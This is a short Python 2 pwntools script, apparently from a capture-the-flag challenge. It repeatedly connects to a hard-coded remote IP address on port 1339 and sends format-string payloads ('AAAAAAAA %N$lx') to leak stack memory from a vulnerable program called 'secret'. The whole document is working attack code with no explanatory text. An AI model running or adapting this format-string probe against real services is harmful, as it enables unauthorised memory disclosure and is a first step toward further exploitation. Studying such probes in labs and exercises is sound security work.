#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
BINARY = './secret'

for i in range(1, 50):
	#p = process(BINARY)
	p = remote('206.81.24.129', 1339)
	p.sendlineafter(': ', 'AAAAAAAA %{}$lx'.format(i))
	print '%02d: '%(i) + p.recvline()[:-1]
	p.close()

print ''
